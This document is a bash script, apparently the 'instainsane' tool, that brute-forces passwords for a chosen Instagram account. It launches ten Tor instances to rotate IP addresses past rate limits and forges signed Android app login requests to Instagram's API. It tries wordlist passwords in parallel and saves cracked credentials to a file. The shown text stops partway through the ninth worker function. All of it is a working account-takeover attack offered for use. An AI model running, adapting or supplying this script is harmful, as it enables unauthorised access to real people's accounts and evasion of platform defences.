

trap 'store; exit 1;' 2

counter=0
counter2=20
counter3=40
counter4=60
counter5=80
counter6=100
counter7=120
counter8=140
counter9=160
counter10=180
start=0
end=20
turn=$((start+end))
startline=1
endline=20
sumstart=0
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
var0=$(curl --socks5 localhost:9051 -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var0 | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)





function start() {
read -p $'\e[1;92mUsername account: \e[0m' user
checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page may have been removed")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mInvalid Username! Try again\e[0m\n"
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="200"
threads="${threads:-${default_threads}}"
fi
}



multitor() {

if [[ ! -d multitor ]]; then
mkdir multitor;
printf "SOCKSPort 9051\nDataDirectory /var/lib/tor1" > multitor/multitor1
printf "SOCKSPort 9052\nDataDirectory /var/lib/tor2" > multitor/multitor2
printf "SOCKSPort 9053\nDataDirectory /var/lib/tor3" > multitor/multitor3
printf "SOCKSPort 9054\nDataDirectory /var/lib/tor4" > multitor/multitor4
printf "SOCKSPort 9055\nDataDirectory /var/lib/tor5" > multitor/multitor5
printf "SOCKSPort 9056\nDataDirectory /var/lib/tor6" > multitor/multitor6
printf "SOCKSPort 9057\nDataDirectory /var/lib/tor7" > multitor/multitor7
printf "SOCKSPort 9058\nDataDirectory /var/lib/tor8" > multitor/multitor8
printf "SOCKSPort 9059\nDataDirectory /var/lib/tor9" > multitor/multitor9
printf "SOCKSPort 9060\nDataDirectory /var/lib/tor10" > multitor/multitor10

fi

printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9051\e[0m\n"
tor -f multitor/multitor1 > /dev/null &
tor1=$!
#printf "Process %s\n" $tor1
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9052\e[0m\n"
tor -f multitor/multitor2 > /dev/null & 
tor2=$!
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9053\e[0m\n"
tor -f multitor/multitor3 > /dev/null &
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9054\e[0m\n"
tor -f multitor/multitor4 > /dev/null &
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9055\e[0m\n"
tor -f multitor/multitor5 > /dev/null &
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9056\e[0m\n"
tor -f multitor/multitor6 > /dev/null &
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9057\e[0m\n"
tor -f multitor/multitor7 > /dev/null &
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9058\e[0m\n"
tor -f multitor/multitor8 > /dev/null &
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9059\e[0m\n"
tor -f multitor/multitor9 > /dev/null &
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9060\e[0m\n"
tor -f multitor/multitor10 > /dev/null &
checkcount=0
printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9051\e[0m..."
check1=$(curl --socks5-hostname localhost:9051 -s https://www.google.com > /dev/null; echo $?)
if [[ "check1" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9052\e[0m..."
check2=$(curl --socks5-hostname localhost:9052 -s https://www.google.com > /dev/null; echo $?)
if [[ "check2" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi
 
printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9053\e[0m..."
check3=$(curl --socks5-hostname localhost:9053 -s https://www.google.com > /dev/null; echo $?)
if [[ "check3" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi


printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9054\e[0m..."
check4=$(curl --socks5-hostname localhost:9054 -s https://www.google.com > /dev/null; echo $?)
if [[ "check4" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9055\e[0m..."
check5=$(curl --socks5-hostname localhost:9055 -s https://www.google.com > /dev/null; echo $?)
if [[ "check5" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9056\e[0m..."
check6=$(curl --socks5-hostname localhost:9056 -s https://www.google.com > /dev/null; echo $?)
if [[ "check6" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9057\e[0m..."
check7=$(curl --socks5-hostname localhost:9057 -s https://www.google.com > /dev/null; echo $?)
if [[ "check7" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9058\e[0m..."
check8=$(curl --socks5-hostname localhost:9058 -s https://www.google.com > /dev/null; echo $?)
if [[ "check8" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9059\e[0m..."
check9=$(curl --socks5-hostname localhost:9059 -s https://www.google.com > /dev/null; echo $?)
if [[ "check9" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9060\e[0m..."
check10=$(curl --socks5-hostname localhost:9060 -s https://www.google.com > /dev/null; echo $?)
if [[ "check10" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

if [[ $checkcount != 10 ]]; then
printf "\e[1;91mRequire all TOR connection running to continue. Exiting\e[0m\n"
exit 1
fi
printf "\n"
printf "\e[1;77m[*] Starting...\e[0m\n"
printf "\e[1;91m [*] Press Crtl + C to Stop/Save session\e[0m\n"
}

function store() {

if [[ -n "$threads" ]]; then
printf "\n"
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
wait $pid1 > /dev/null 2>&1 ; wait $pid2 > /dev/null 2>&1 ; wait $pid3 > /dev/null 2>&1 ; wait $pid4 > /dev/null 2>&1 ; wait $!;
sleep 6
if [[ -e nottested.lst ]]; then
not=$(wc -l nottested.lst | cut -d " " -f1)
printf "\e[1;92m [!] Passwords not tested due IP BLocking:\e[0m\e[1;77m %s\e[0m\n" $not
ssfile="nottested.$user.$RANDOM"
sfile=$(mv nottested.lst $ssfile | echo $ssfile) 
printf "\e[1;92m [*] Saved:\e[0m\e[1;77m %s\n" $sfile
rm -rf nottested.lst
printf "\e[1;91m [!] Use this file as wordlist!\e[0m\n"
fi
default_session="Y"
printf "\n\e[1;77m [?] Save session for user\e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $user $pass $wl_pass $countpass > sessions/store.session.$user.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./instainsane.sh --resume\n"
else
exit 1
fi
else
exit 1
fi
}


bf1() {

while [ $counter -lt $turn ]; do

IFS=$'\n'
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9051 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1  ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid1=$! ; #;wait $!;
 
let startline+=20
let endline+=20

done

}


bf2() {

while [ $counter2 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter2++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9052 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst ; kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid2=$! ; # wait $!;

let startline+=20
let endline+=20

done

}


bf3() {

while [ $counter3 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter3++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9053 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]];  then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid3=$! ; # wait $!;

let startline+=20
let endline+=20

done
}


bf4() {

count_pass=$(wc -l $wl_pass | cut -d " " -f1)
while [ $counter4 -lt $turn ]; do

IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'


let counter4++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then  echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid4=$! ; # wait $!;

let startline+=20
let endline+=20

done
}

bf5() {

while [ $counter5 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter5++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m";  rm -rf nottested.lst;kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid5=$! ;

let startline+=20
let endline+=20

done
}

bf6() {

while [ $counter6 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter6++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9056 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m";  rm -rf nottested.lst;kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid6=$! ;

let startline+=20
let endline+=20

done
}

bf7() {

while [ $counter7 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter7++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9057 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m";  rm -rf nottested.lst;kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid7=$! ;

let startline+=20
let endline+=20

done
}

bf8() {

while [ $counter8 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter8++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9058 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m";  rm -rf nottested.lst;kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid8=$! ;

let startline+=20
let endline+=20

done
}
bf9() {

while [ $counter9 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
